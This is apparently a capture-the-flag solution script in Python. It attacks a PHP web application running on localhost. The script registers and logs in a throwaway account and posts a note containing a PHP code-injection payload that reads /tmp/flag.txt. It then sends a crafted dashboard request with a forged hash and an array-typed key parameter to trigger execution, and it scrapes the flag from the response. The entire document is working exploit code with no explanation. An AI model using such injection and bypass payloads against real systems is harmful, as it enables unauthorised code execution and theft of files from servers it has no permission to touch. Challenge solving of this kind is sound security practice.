import requests
import string
import random
import re

session = requests.Session()
BASE_URL = 'http://127.0.0.1:8080' # Change url here

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

credentials = {
    'username': random_string(),
    'password': random_string()
}

session.post(f'{BASE_URL}/register.php', data=credentials)
login_resp = session.post(f'{BASE_URL}/login.php', data=credentials, allow_redirects=False)
redirect_location = login_resp.headers.get('Location')
if redirect_location:
    session.get(f'{BASE_URL}/{redirect_location.lstrip("/")}')
payload = {
    'note': 'get_defined_functions()["internal"][789]("/tmp/flag.txt");'
}
session.post(f'{BASE_URL}/post_note.php', data=payload)
exploit_url = f'{BASE_URL}/dashboard.php?msg=cea&hash=mq%2F1NjPIVqO8vD4dQU%2B4mg%3D%3D&key[]='
exploit_resp = session.get(exploit_url)
match = re.search(r'(L3AK\{.*?\})', exploit_resp.text)
if match:
    print(f'Flag found: {match.group(1)}')
else:
    print('Flag not found.')